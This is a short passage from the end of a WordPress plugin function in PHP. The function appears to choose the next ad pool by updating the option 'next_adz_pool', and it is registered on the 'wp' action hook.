							if(empty($premium_adz_serving_from)){
								update_option('next_adz_pool','publisher');
							}				
						}else{
							update_option('next_adz_pool','publisher');
						}
					}

					exit;
				}// End of if

			}//End of if else
		}//End of if to check adz_content
	}// End of if to check $response
}//End of function

add_action('wp','check_thru_page_adz');
?>